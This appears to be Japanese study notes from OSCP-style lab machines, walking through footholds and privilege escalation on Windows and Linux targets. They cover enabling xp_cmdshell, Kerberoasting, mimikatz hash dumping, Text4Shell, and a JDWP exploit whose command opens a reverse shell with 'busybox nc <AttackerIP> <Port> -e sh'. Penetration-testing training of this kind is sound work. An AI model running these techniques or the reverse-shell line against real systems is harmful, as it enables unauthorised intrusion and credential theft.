# AD

## MS01

1. 提供された認証情報でSSH接続し、カレントユーザー情報を検索すると、SeImpersonatePrivilegeが有効、かつ、PrintSpoolerもRunningになっていたため、PrintSpooferを使い権限昇格

2. Kerberoastingをし、WEB_SVCとSQL_SVCの認証情報を入手

3. MS02をスキャンし、MSSQLポートがopenになっていたため、SQL_SVCの認証情報でMS02に接続
```zsh
impacket-mssqlclient sql_svc@10.10.140.148 -port 1433 -windows-auth
```
- `-windows-auth`：SQLのユーザーとしてではなく、Windowsユーザーとして認証
- やり方はあっているのに、コマンド文法のミスで大幅に時間をロスした

## MS02

1. ログインしたユーザーが`dbo@master`であり、systemadmin権限をもっていたため、xp_cmdshellを有効化
```zsh
SQL (OSCP\sql_svc  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\sql_svc  dbo@master)> RECONFIGURE;
SQL (OSCP\sql_svc  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\sql_svc  dbo@master)> RECONFIGURE;
```

2. RCEでリバースシェル接続しようとするも、MS02からKaliに直接接続ができなかったため、Ligolo-ngのListenerを利用して、リバースシェル獲得

3. seimpersonateが有効であったため、権限昇格し、mimikatzでハッシュをダンプし、DC01でadmin権限をもつユーザーのNTLMハッシュを用いてDC01にPtHで接続

---

# Kiero

1. SNMPのOIDを使ってextend機能を列挙し、kieroというユーザーのパスワードがdefault valueになっていることを確認
```zsh
$ snmpwalk -c public -v2c 192.168.210.149 NET-SNMP-EXTEND-MIB::nsExtendObjects   
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
...
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."RESET" = STRING: Resetting password of kiero to the default value
```

2. kiero:kieroでftpにログインすると、sshの秘密鍵と公開鍵を発見し、公開鍵にjohnというユーザー名が記載されていたため、johnでssh接続

3. Dirty Pipeを実行し、権限昇格
	- Kernel Exploitを後回しにして、実行せず、路頭に迷った
	- ==つまったら、Kernel Exploitを実行すること==（最初から実行するのはダメだけど）
	- LinPEASのExposure（成功確率）は当てにならない（less probableで成功）

---

# Berlin

1. httpポートをGobusterで列挙すると、CHANGELOGとsearchというページがヒットし、CHANGELOGに"Apache Commons Text 1.8"を利用したと記載があった

2. Apache Commons Text 1.8を調べると、"Text4shell"という脆弱性を発見したので、PoCを用いてリバースシェルを獲得した
	- URLエンコードのところで非常に時間がかかった
	- 💡`wget`でペイロードをダウンロードするときは、`http://`はいらない
	- ==すべてURLエンコードするのではなく、PoCでエンコードされている部分だけエンコードする==
	- GitHubやExploit-DBにはPoCスクリプトがあるが、動作原理を詳しく解説したものが少なく、今回はそれら以外のリソースから動作原理を理解してエクスプロイトしたことが成功の要因

3. ローカルサービスとして、jdwpが動作していることを確認
```zsh
root         859  0.0  1.7 2528964 35288 ?       Ssl  Jan06   0:00 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
```

4. [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier)を使って権限昇格した
```zsh
# 240.0.0.1はLigoloのmagic cidr
$ ./jdwp-shellifier.py -t 240.0.0.1 -p 8000 --cmd 'busybox nc <AttackerIP> <Port> -e sh'
[+] Target: 127.0.0.1:8000
[*] Trying to connect...
[+] Connection successful!
...
[*] Go triggering the corresponding ServerSocket (e.g., 'nc ip 5000 -z')
```
```zsh
nc <TargetIP> 5000 -z
```
- ==反省：ツールの出力を読むこと==（指示があれば）
	- →Go triggering the corresponding ServerSocket (e.g., 'nc ip 5000 -z')とあったのに、実行中のシェルに無意味にコマンドを入力実行していた
- 💡busyboxがLinuxターゲットにおいて環境依存を減らしてコマンドを実行できるので良い

---

# Gust

1. ポート8021 がopenであり、"freeswitch-event"であることを特定
```zsh
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
```

2. freeswitchが[CVE-2019-19492](https://nvd.nist.gov/vuln/detail/CVE-2019-19492)に脆弱であり、RCEでinitial foothold獲得

3. seimpersonate権限が有効で、Print SpoolerがStoppedであったので、SigmaPotatoを使い、権限昇格

4. Potatoシリーズのシェルは不安定なので、権限昇格後にユーザーを作成、Administratorsグループに加えて、RDP接続